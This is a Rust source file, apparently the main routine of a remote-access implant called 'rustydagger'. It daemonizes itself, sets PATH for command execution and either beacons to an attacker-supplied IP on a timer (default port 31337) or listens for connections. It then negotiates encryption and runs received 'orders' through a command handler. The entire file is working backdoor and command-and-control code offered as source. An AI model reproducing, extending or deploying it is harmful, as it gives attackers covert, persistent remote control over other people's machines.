extern crate libc;
extern crate daemonize;
extern crate rustydagger;

use std::*;
use std::time::Duration;
use daemonize::{Daemonize};
use rustydagger::communication::*;
use rustydagger::handler::*;
use rustydagger::data_mod::encryption;

//Buffer size to be used when sending and receiving data
//over the network.  Abitrarily set to 4Kb for the moment
const NET_BUFF: usize = 4096;

fn main() {

    let daemonize = Daemonize::new();
    daemonize.start().unwrap();
    //Re-populate PATH variable to allow command execution
    //This PATH is based on a Debian 8 host
    env::set_var("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");

    //Get IP, port, beacon interval, and mode from environment variables
    let communication_port = if env::var_os("P") != None {
        match env::var("P") {
            Ok(port) => match port.parse::<u16>() {
                Ok(ok) => ok,
                Err(err) => panic!("{:?}", err),
            },
            Err(err) => panic!("{:?}", err),
        }
    } else {
        31337
    };
    if env::var_os("C") != None && env::var_os("L") != None {
        panic!("C and L are mutually exclusive.");
    }
    let communication_ip = if env::var_os("C") != None {
        match env::var("C") {
            Ok(ip) => match ip.parse::<net::Ipv4Addr>() {
                Ok(ip) => ip,
                Err(err) => panic!("Couldn't parse IP address {:?}", err),
            },
            Err(err) => panic!("{:?}", err),
        }
    } else if env::var_os("L") != None {
        match env::var("L") {
            Ok(ip) => match ip.parse::<net::Ipv4Addr>() {
                Ok(ip) => ip,
                Err(err) => panic!("Couldn't parse IP address {:?}", err),
            },
            Err(err) => panic!("{:?}", err),
        }
    } else {
        panic!("Couldn't find a valid IP address");
    };

    //If requested beacon time wouldn't fit in a u32, ~30 days,
    //interval will be set to 15 minutes
    let beacon_interval = if env::var_os("B") != None {
        match env::var("B") {
            Ok(interval) => {
                Duration::new((interval.parse::<u64>().unwrap()),0)
            },
            _ => Duration::new(900,0),
        }
    } else {
        Duration::new(900,0)
    };

    //Create SocketAddrV4 using the IP and port parsed above
    let communication_socket = net::SocketAddrV4::new(communication_ip, communication_port);
    
    //Main program loop
    //Connect, or bind, to IP and port from above
    if env::var_os("C") != None {
        loop {
            let connection_socket = match net::TcpStream::connect(communication_socket) {
                Ok(connection) => connection,
                _ => { thread::sleep(beacon_interval); continue },
            };
            thread::spawn(move || {
                communication_loop(connection_socket);
            });
            thread::sleep(beacon_interval);
        }
    } else if env::var_os("L") != None {
            let listening_socket = net::TcpListener::bind(communication_socket).unwrap();
            loop {
                let connection_socket = match listening_socket.accept() {
                    Ok(connection) => connection.0,
                    Err(_) => continue,
                };
                thread::spawn(move || {
                    communication_loop(connection_socket);
                });
            }
    } 
}

fn communication_loop(communication_stream: net::TcpStream) -> () {
    //Create buffer to hold input.
    //Note that the 4096 is currently and arbitrary choice.
    let mut tcp_session = tcp_connection::create(communication_stream, NET_BUFF);
    let mut keyring = encryption::create_keyring();
    //Receive public key from client
    tcp_session.recv();
    encryption::send_pubkey(&mut tcp_session, &keyring);
    encryption::gen_sharedkey(&tcp_session.input_buffer, &mut keyring);
    encryption::get_iv(&mut tcp_session, &mut keyring);
    let mut encrypted_session = encrypted_tcp::create(tcp_session, keyring);
    loop {
        let orders = encrypted_session.get_orders();
        match command_parse::parse_input(&mut encrypted_session, orders) {
            1 => break,
            _ => continue,
        }
    }
    ()
}
